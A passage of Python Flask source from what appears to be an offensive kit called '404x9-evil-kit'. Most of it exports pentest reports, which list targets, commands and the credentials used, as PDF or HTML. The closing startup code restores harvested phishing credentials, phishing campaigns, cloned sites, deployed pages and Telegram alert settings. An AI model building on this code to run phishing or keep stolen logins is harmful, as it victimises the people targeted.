        return jsonify({'error': 'python-docx no instalado. Ejecuta: pip install python-docx'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/reports/<rid>/export/pdf')
def api_reports_pdf(rid):
    with _rpt_lock:
        r = _reports.get(rid)
    if not r:
        return jsonify({'error': 'not found'}), 404
    try:
        from weasyprint import HTML
        html_content = _build_report_html(r, auto_print=False)
        pdf_bytes = HTML(string=html_content, base_url=None).write_pdf()
        ts2   = datetime.datetime.fromisoformat(r['timestamp']).strftime('%Y%m%d_%H%M%S')
        fname = f"report_{r.get('tool','rpt')}_{ts2}.pdf"
        return Response(
            pdf_bytes,
            mimetype='application/pdf',
            headers={'Content-Disposition': f'attachment; filename="{fname}"'}
        )
    except ImportError:
        return jsonify({'error': 'weasyprint no instalado. Ejecuta: pip install weasyprint'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/reports/<rid>/view')
def api_reports_view(rid):
    with _rpt_lock:
        r = _reports.get(rid)
    if not r:
        return 'Report not found', 404
    auto_print = request.args.get('print') == '1'
    return Response(_build_report_html(r, auto_print), mimetype='text/html; charset=utf-8')

_HTML_STRIP_RE = re.compile(r'<[^>]+>')
def _strip_html(html):
    """Strip HTML tags for plain-text use in Word/text exports."""
    txt = re.sub(r'<br\s*/?>', '\n', html or '', flags=re.IGNORECASE)
    txt = re.sub(r'<[^>]+>', ' ', txt)
    txt = re.sub(r'[ \t]{2,}', ' ', txt)
    return '\n'.join(l.strip() for l in txt.splitlines() if l.strip())

def _build_report_html(r, auto_print=False):
    ts      = datetime.datetime.fromisoformat(r['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
    tool    = r.get('tool', '')
    target  = r.get('target', '')
    cmd     = r.get('command', '')
    creds   = r.get('credentials_used') or {}
    summary = r.get('summary', '')
    finds   = r.get('findings') or []
    inds    = r.get('indicators') or []
    errs    = r.get('errors') or []
    evids   = r.get('evidence') or []
    raw     = r.get('raw_output', '')
    parsed_html = r.get('parsed_html', '')

    def esc(s):
        return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')

    def mk_list(items, cls):
        if not items:
            return '<p class="none-msg">— ninguno —</p>'
        li = ''.join(f'<li class="li-{cls}">{esc(i)}</li>' for i in items)
        return f'<ul class="flist">{li}</ul>'

    cred_rows = ''
    if creds:
        for k, v in creds.items():
            cred_rows += f'<tr><td class="td-lbl">{esc(k)}</td><td>{esc(str(v))}</td></tr>'
    else:
        cred_rows = '<tr><td colspan="2" class="none-msg">— no registradas —</td></tr>'

    parsed_sec = ''
    if parsed_html:
        parsed_sec = f'''<div class="section">
      <div class="sec-hdr">OUTPUT PARSED</div>
      <div class="sec-body parsed-wrap">{parsed_html[:300000]}</div>
    </div>'''

    ap_js = '<script>window.onload=()=>setTimeout(()=>window.print(),800)</script>' if auto_print else ''
    raw_lines = len(raw.splitlines())

    return f'''<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>PENTEST REPORT — {esc(tool)} — {esc(ts)}</title>
<style>
:root{{--g:#00ff88;--g2:#4dc880;--bg:#030604;--bg2:#050a06;--brd:#163019;--txt:#c8ffdc;--mut:#3d8a56;--red:#ff4f4f;--yellow:#f5c542;--cyan:#00d8ff;--blue:#4da6ff}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'JetBrains Mono',Consolas,'Courier New',monospace;background:var(--bg);color:var(--txt);font-size:13px;line-height:1.6}}
a{{color:var(--cyan)}}
.page{{max-width:1080px;margin:16px auto;background:var(--bg2);border:1px solid var(--brd);border-radius:4px;overflow:hidden;box-shadow:0 0 40px rgba(0,0,0,.8)}}
.hdr{{background:linear-gradient(135deg,#030a04,#081208);padding:24px 28px;border-bottom:1px solid var(--brd)}}
.hdr-title{{font-size:22px;color:var(--g);font-weight:700;letter-spacing:5px;text-shadow:0 0 16px rgba(0,255,136,.3);margin-bottom:5px}}
.hdr-sub{{font-size:11px;color:var(--mut);letter-spacing:2px}}
.body{{padding:18px 24px}}
.cards{{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px;margin-bottom:18px}}
.card{{background:#020503;border:1px solid #0f1e10;border-radius:3px;padding:8px 12px}}
.card-lbl{{font-size:9px;color:var(--mut);letter-spacing:2px;text-transform:uppercase;margin-bottom:2px}}
.card-val{{font-size:15px;font-weight:700;word-break:break-all}}
.cv-g{{color:var(--g)}}.cv-c{{color:var(--cyan)}}.cv-r{{color:var(--red)}}.cv-y{{color:var(--yellow)}}.cv-w{{color:var(--txt)}}
.sum-box{{background:#010401;border-left:3px solid var(--g);padding:10px 14px;margin-bottom:14px;border-radius:0 3px 3px 0;font-size:13px;color:var(--txt);line-height:1.7}}
.section{{border:1px solid #0f1e10;border-radius:3px;overflow:hidden;margin-bottom:12px}}
.sec-hdr{{background:#030803;padding:7px 14px;font-size:10px;font-weight:700;color:var(--mut);letter-spacing:3px;text-transform:uppercase;border-bottom:1px solid #0f1e10}}
.sec-body{{padding:10px 14px;background:#020402}}
table.t{{width:100%;border-collapse:collapse}}
table.t td{{padding:5px 8px;border-bottom:1px solid #0a1209;font-size:12px;vertical-align:top;color:var(--txt)}}
.td-lbl{{color:var(--mut);width:130px;white-space:nowrap;font-size:11px;letter-spacing:1px}}
.flist{{list-style:none;padding:0;margin:0}}
.flist li{{padding:3px 0;font-size:12px;border-bottom:1px solid #080e09;word-break:break-all;line-height:1.6}}
.li-find{{color:var(--g);padding-left:8px;border-left:2px solid var(--g)}}
.li-ind{{color:var(--cyan);padding-left:8px;border-left:2px solid var(--cyan)}}
.li-err{{color:var(--red);padding-left:8px;border-left:2px solid var(--red)}}
.li-evd{{color:var(--yellow);padding-left:8px;border-left:2px solid var(--yellow)}}
.bdg{{display:inline-block;font-size:9px;padding:1px 6px;border-radius:2px;font-weight:700;margin-left:6px;letter-spacing:1px}}
.bdg-g{{background:#0a1a0a;color:var(--g);border:1px solid #1a3a1a}}
.bdg-c{{background:#01090e;color:var(--cyan);border:1px solid #0a1e2e}}
.bdg-r{{background:#0e0a0a;color:var(--red);border:1px solid #280e0e}}
.bdg-y{{background:#0e0d00;color:var(--yellow);border:1px solid #281e00}}
.code{{font-family:'JetBrains Mono',Consolas,'Courier New',monospace;font-size:11px;color:#8acc90;background:#010301;padding:10px;border-radius:2px;white-space:pre-wrap;word-break:break-all;max-height:600px;overflow-y:auto;line-height:1.55}}
.none-msg{{color:var(--mut);font-size:12px;padding:6px 0}}
.footer{{background:#030703;padding:9px 24px;font-size:10px;color:var(--mut);letter-spacing:2px;border-top:1px solid var(--brd)}}
/* ── Parsed HTML embed ── */
.parsed-wrap{{font-size:12px;overflow-x:auto;line-height:1.6;font-family:'JetBrains Mono',Consolas,'Courier New',monospace}}
.parsed-wrap table{{border-collapse:collapse;width:100%;margin:6px 0;font-size:11px}}
.parsed-wrap td,.parsed-wrap th{{border:1px solid #1a3a1a;padding:4px 8px;color:var(--txt);vertical-align:top;word-break:break-word}}
.parsed-wrap th{{background:#030803;color:var(--mut);font-size:10px;letter-spacing:1px;font-weight:700;text-transform:uppercase}}
.parsed-wrap tr:nth-child(even) td{{background:#010301}}
.parsed-wrap ul,.parsed-wrap ol{{padding-left:18px;margin:4px 0}}
.parsed-wrap li{{padding:2px 0;font-size:12px;line-height:1.7}}
.parsed-wrap pre{{white-space:pre-wrap;word-break:break-all;font-size:11px;margin:4px 0}}
.parsed-wrap div{{margin:1px 0}}
@media print{{
  :root{{--bg:#fff;--bg2:#fff;--txt:#111;--g:#1a6e33;--mut:#555;--cyan:#0a5a7a;--red:#8a1a1a;--yellow:#7a5a00;--brd:#ddd}}
  body{{background:#fff;color:#111}}
  .page{{box-shadow:none;margin:0;border-radius:0;max-width:none;border:none}}
  .hdr{{background:#f0f6f1 !important;border-bottom:2px solid #ccc}}
  .hdr-title{{color:#1a6e33 !important;text-shadow:none}}
  .sec-hdr{{background:#f0f6f1 !important;color:#333 !important}}
  .sec-body{{background:#fafff8 !important}}
  .code{{background:#f4f8f4 !important;color:#1a2a1a !important;max-height:none !important;overflow:visible !important}}
  .card{{background:#f7fdf8 !important;border-color:#c8e5ce !important}}
  .sum-box{{background:#f7fdf8 !important;border-color:#2da84c !important}}
  .parsed-wrap{{color:#111 !important}}
  .parsed-wrap td,.parsed-wrap th{{border-color:#ccc !important;color:#111 !important;background:#fff !important}}
  .parsed-wrap th{{background:#f0f6f1 !important;color:#333 !important}}
  .parsed-wrap tr:nth-child(even) td{{background:#f8fdf8 !important}}
  .parsed-wrap span{{color:#111 !important}}
  .parsed-wrap *{{color:#111 !important}}
}}
</style>{ap_js}
</head>
<body>
<div class="page">
  <div class="hdr">
    <div class="hdr-title">PENTEST REPORT</div>
    <div class="hdr-sub">404x9-evil-kit &nbsp;·&nbsp; by @xfraylin &nbsp;·&nbsp; {esc(ts)} &nbsp;·&nbsp; ID: {esc(r['id'])}</div>
  </div>
  <div class="body">
    <div class="cards">
      <div class="card"><div class="card-lbl">Herramienta</div><div class="card-val cv-g">{esc(tool)}</div></div>
      <div class="card"><div class="card-lbl">Target</div><div class="card-val cv-w" style="font-size:12px">{esc(target or '—')}</div></div>
      <div class="card"><div class="card-lbl">Hallazgos</div><div class="card-val cv-g">{len(finds)}</div></div>
      <div class="card"><div class="card-lbl">Indicadores</div><div class="card-val cv-c">{len(inds)}</div></div>
      <div class="card"><div class="card-lbl">Errores</div><div class="card-val cv-r">{len(errs)}</div></div>
      <div class="card"><div class="card-lbl">Evidencia</div><div class="card-val cv-y">{len(evids)}</div></div>
    </div>

    <div class="section">
      <div class="sec-hdr">Detalles de Ejecución</div>
      <div class="sec-body">
        <table class="t">
          <tr><td class="td-lbl">Comando</td><td style="color:var(--cyan);font-size:11px">{esc(cmd)}</td></tr>
          <tr><td class="td-lbl">Credenciales</td><td><table class="t">{cred_rows}</table></td></tr>
        </table>
      </div>
    </div>

    <div class="sum-box"><span style="color:var(--g);font-weight:700">Resumen:</span> {esc(summary)}</div>

    <div class="section">
      <div class="sec-hdr">Hallazgos <span class="bdg bdg-g">{len(finds)}</span></div>
      <div class="sec-body">{mk_list(finds,'find')}</div>
    </div>
    <div class="section">
      <div class="sec-hdr">Indicadores <span class="bdg bdg-c">{len(inds)}</span></div>
      <div class="sec-body">{mk_list(inds,'ind')}</div>
    </div>
    <div class="section">
      <div class="sec-hdr">Errores <span class="bdg bdg-r">{len(errs)}</span></div>
      <div class="sec-body">{mk_list(errs,'err')}</div>
    </div>
    <div class="section">
      <div class="sec-hdr">Evidencia <span class="bdg bdg-y">{len(evids)}</span></div>
      <div class="sec-body">{mk_list(evids,'evd')}</div>
    </div>

    {parsed_sec}

    <div class="section">
      <div class="sec-hdr">Output RAW Completo <span class="bdg" style="background:#060d07;color:var(--mut);border:1px solid var(--brd)">{raw_lines} líneas</span></div>
      <div class="sec-body"><pre class="code">{esc(raw[:80000])}</pre></div>
    </div>
  </div>
  <div class="footer">404x9-evil-kit &nbsp;·&nbsp; by @xfraylin &nbsp;·&nbsp; {esc(ts)}</div>
</div>
</body></html>'''

def _restore_state():
    """Restore persisted state on server startup."""
    s = _load_state()
    if not s:
        return

    if 'phish_creds' in s:
        with phish_lock:
            phish_creds.extend(s['phish_creds'])

    if 'campaigns' in s:
        with camp_lock:
            campaigns.update(s['campaigns'])

    if 'phish_tracking' in s:
        with track_lock:
            phish_tracking.update(s['phish_tracking'])

    if 'cloned_sites' in s:
        with clone_lock:
            cloned_sites.update(s['cloned_sites'])

    if 'deployed_pages' in s:
        with deploy_lock:
            deployed_pages.update(s['deployed_pages'])

    if 'tg_config' in s:
        with _tg_lock:
            _tg_config.update(s['tg_config'])

    print(f'[state] restored: {len(s.get("campaigns",{}))} campaigns, '
          f'{len(s.get("phish_creds",[]))} creds, '
          f'{len(s.get("deployed_pages",{}))} pages, '
          f'tg={"on" if s.get("tg_config",{}).get("enabled") else "off"}')
    _rpt_load()

if __name__ == '__main__':
    _restore_state()
    banner = r"""
  _  _    ___  _  _  _  _  ___  ___  _ __      _  _     _
 | || |  / _ \| || |_( )/ _|/ _ \| __|\ V /    | || |__ (_)_
 | \| | | (_) | \/ / |/\__ \ (_) | _|  > <     | / / _|| | _|  
  \_,_|  \___/ \__/  |_||___/\___/|___/_/\_\    \_/\__||_|___|

  404x9-evil-kit  ·  by @xfraylin
  URL   → http://localhost:5000
  Press Ctrl+C to stop
"""
    print(banner)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
